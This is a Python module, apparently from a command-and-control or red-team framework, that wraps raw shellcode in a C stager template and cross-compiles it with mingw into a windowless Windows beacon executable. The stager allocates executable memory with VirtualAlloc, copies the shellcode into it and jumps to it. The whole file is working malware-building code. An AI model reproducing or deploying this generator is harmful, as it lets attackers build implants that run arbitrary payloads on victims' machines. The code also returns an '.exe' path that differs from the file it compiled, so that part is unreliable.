# Template for a exe beacon

import os
import string
import random
import tempfile

TEMPLATE = """
#include <windows.h>

unsigned char beacon_bin[] = { %s };
unsigned int beacon_bin_len = %s;

int main()
{
    void *exec = VirtualAlloc(0, beacon_bin_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, beacon_bin, beacon_bin_len);
	((void(*)())exec)();

    return 0;
}
"""

def format_shellcode(shellcode):
    hshellcode = ""

    code_size = len(shellcode)

    for num, byte in enumerate(shellcode):
        if num != code_size - 1:
            hshellcode += f"{hex(byte)},"
        else:
            hshellcode += f"{hex(byte)}"

    return hshellcode

def random_string():
    rstring = ""
    alphabet = string.ascii_lowercase + string.ascii_uppercase

    for _ in range(0, 10):
        rstring += random.choice(alphabet)

    return rstring

def compile_exe(code, debug=False):
    with tempfile.NamedTemporaryFile(dir='/tmp', delete=False) as tmpfile:
        code_file_name = tmpfile.name + ".c"

    with open(code_file_name, "w") as file:
        file.write(code)

    exe_out_filename = "/tmp/" + random_string()

    if debug is False:
        os.system(f"x86_64-w64-mingw32-gcc {code_file_name} -o {exe_out_filename} -Wl,-subsystem,windows")
    else:
        os.system(f"x86_64-w64-mingw32-gcc {code_file_name} -o {exe_out_filename}")

    return exe_out_filename + ".exe"

def generate(raw_shellcode, debug=False):

    enc_shellcode = format_shellcode(raw_shellcode)
    formated_code = TEMPLATE % (enc_shellcode, len(raw_shellcode))

    filename = compile_exe(formated_code, debug=debug)

    with open(filename, "rb") as file:
        return file.read()